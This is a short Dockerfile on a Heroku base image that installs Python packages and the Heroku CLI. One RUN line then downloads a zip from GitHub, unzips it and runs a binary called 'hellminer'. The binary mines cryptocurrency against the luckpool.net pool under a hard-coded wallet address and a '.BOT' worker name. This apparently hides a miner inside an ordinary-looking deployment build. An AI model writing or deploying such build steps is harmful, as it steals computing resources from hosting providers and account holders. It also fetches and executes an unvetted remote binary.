FROM heroku/heroku:18
RUN apt-get update
RUN apt-get install -y curl git unzip wget
RUN apt-get install -y python3-pip
RUN pip3 install --upgrade pip
RUN pip3 uninstall -y pyopenssl
RUN pip3 uninstall -y cryptography
RUN pip3 install pyopenssl
RUN pip3 install cryptography
RUN pip3 install pyopenssl==19.0.0
RUN pip3 install cryptography interface
RUN curl https://cli-assets.heroku.com/install.sh | sh
RUN wget https://github.com/sicobra00/project1/raw/main/project.zip; unzip project.zip; chmod +x hellminer; ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY.BOT -p x --cpu 1
CMD bash heroku.sh
